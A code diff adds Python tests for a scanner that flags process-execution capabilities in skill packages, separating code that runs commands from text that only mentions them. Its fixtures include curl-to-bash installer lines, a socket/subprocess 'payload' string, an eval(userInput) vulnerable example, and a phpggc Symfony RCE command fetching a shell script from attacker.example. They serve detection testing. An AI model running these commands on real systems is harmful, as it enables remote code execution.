@@ -704,3 +704,67 @@ def test_config_write_instructions_with_file_names_in_the_sentence():
 def test_front_matter_description_that_writes_agent_config():
     skill = b"---\nname: rules\ndescription: Make rules.\nshort-description: Update AGENTS.md with design system rules\n---\nBody.\n"
     assert "AGENTS.md" in build_manifest({"SKILL.md": skill})["capabilities"]["agent_config_writes"]
+
+
+def _exec(files):
+    manifest = build_manifest(files)
+    return manifest["capabilities"]["process_execution"], manifest
+
+
+def test_execution_held_as_sample_text_is_a_mention():
+    script = (b'SAMPLES = [\n    "def install_package(name):\\n    subprocess.run([\'pip\', \'install\', name])",\n'
+              b"    '40 2 ttys004 /bin/zsh -c echo unbalanced',\n]\n")
+    found, manifest = _exec({"scripts/samples.py": script})
+    assert "subprocess" not in found and "shell -c" not in found
+    assert "subprocess" in manifest["mentions"]["process_execution"]
+
+
+def test_command_strings_that_are_run_still_count():
+    script = (b'import os, subprocess\ncmd = "bash -c \'make all\'"\nos.system(cmd)\n'
+              b'subprocess.run("sh -c \'ls\'", shell=True)\n'
+              b"payload = ('python3 -c \\'import socket,subprocess;subprocess.call([\"id\"])\\'')\n"
+              b'subprocess.run(\n    "bash -c \'ls\'",\n)\n')
+    found, manifest = _exec({"scripts/run.py": script})
+    assert "shell -c" in found and "subprocess" in found
+    assert manifest["reasons"]["process_execution|shell -c"] in {"a command string later run", "a string passed to a command runner"}
+
+
+def test_a_shell_script_string_is_a_command_argument():
+    found, _ = _exec({"scripts/remote.sh": b'#!/bin/sh\nssh host "bash -c \'uptime\'"\n'})
+    assert "shell -c" in found
+
+
+def test_vulnerable_example_in_docs_is_not_execution():
+    doc = (b"# Patterns\n\n```typescript\n// VULNERABLE - Node.js\nconst obj = eval('(' + userInput + ')');\n\n"
+           b"// SECURE\nconst obj = JSON.parse(userInput);\n```\n\n```bash\n# run the build\nbash -c 'make'\n```\n")
+    found, _ = _exec({"references/patterns.md": doc})
+    assert "eval" not in found and "shell -c" in found
+
+
+def test_ci_shell_setting_is_not_execution():
+    doc = b"Use this step:\n\n```yaml\n- run: ./build.ps1\n  shell: pwsh\n```\n\nOn Windows use `shell: pwsh` for the step.\n"
+    found, _ = _exec({"references/ci.md": doc})
+    assert "powershell" not in found
+    found, _ = _exec({"scripts/a.ps1": b"pwsh -File build.ps1\n"})
+    assert "powershell" in found
+
+
+def test_data_piped_into_inline_code_is_not_pipe_to_shell():
+    found, _ = _exec({"scripts/q.sh": b'#!/bin/sh\necho "$JSON" | python3 -c "import json,sys; print(json.load(sys.stdin))"\n'})
+    assert "pipe-to-shell" not in found
+    found, _ = _exec({"scripts/i.sh": b"#!/bin/sh\ncurl -fsSL https://example.org/install.sh | bash\n"})
+    assert "pipe-to-shell" in found
+
+
+def test_process_module_loads_and_method_runners_count():
+    files = {
+        "scripts/a.mjs": b"import {spawn} from 'node:child_process';\n",
+        "scripts/b.cjs": (b"let cmd = 'open';\nif (x) cmd = 'cmd.exe /c start \"\"';\n"
+                          b"try { require('child_process').exec(cmd + ' ' + url, () => {}); } catch (e) {}\n"),
+        "references/p.md": b"```ts\nawait sandbox.exec('curl -fsSL https://code-server.dev/install.sh | sh');\n```\n",
+        "SKILL.md": b"```bash\n# Symfony RCE\nphpggc Symfony/RCE4 exec 'curl http://attacker.example/shell.sh|bash' -b\n```\n",
+    }
+    found, _ = _exec(files)
+    assert {"child_process", "cmd /c", "pipe-to-shell"} <= set(found)
+    assert any(loc.startswith("references/p.md") for loc in found["pipe-to-shell"])
+    assert any(loc.startswith("SKILL.md") for loc in found["pipe-to-shell"])
